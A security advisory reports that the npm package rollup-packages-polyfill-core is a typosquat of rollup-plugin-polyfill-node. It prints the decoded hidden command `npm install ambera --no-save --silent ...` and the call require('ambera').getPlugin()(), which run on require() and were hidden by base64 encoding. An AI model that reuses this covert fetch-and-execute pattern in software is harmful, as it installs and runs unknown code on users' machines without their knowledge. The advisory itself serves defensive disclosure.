summary: Typosquat of rollup-plugin-polyfill-node silently installs and executes third-party npm package on require()
details: rollup-packages-polyfill-core is a typosquat of rollup-plugin-polyfill-node. The main entry dist/index.js runs a ValidateSvgModule() routine at module top level on require(). A base64 literal in dist/index.js decodes to the shell command `npm install ambera --no-save --silent --no-audit --no-fund`, which is executed via child_process.spawn; the `--no-save` flag keeps the transitively-installed package out of package.json and package-lock.json. A second base64 literal decodes to the module name `ambera`, which is then require()'d and invoked as `require('ambera').getPlugin()()`, executing whatever code that separately-published package ships. Both the shell command and the module name are stored base64-encoded, hiding the behavior from plain string review of the source.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
